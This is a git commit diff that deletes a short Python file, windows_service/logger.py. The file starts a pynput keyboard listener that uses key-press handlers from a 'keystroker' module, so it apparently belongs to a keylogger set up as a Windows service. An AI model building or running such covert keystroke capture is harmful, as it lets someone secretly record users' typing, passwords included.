b2140ae71940afe5ec1e0eebe78754d02728eef5
gar7mn <gar7mn@missouri.edu>
2024-11-27 08:58:22 -0600

    remove old files

--- windows_service/logger.py
+++
@@ -1,7 +0,0 @@
-from keystroker import on_press,on_release
-from pynput import *
-
-def keyboard_listen():
-    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
-        listener.join()
-    
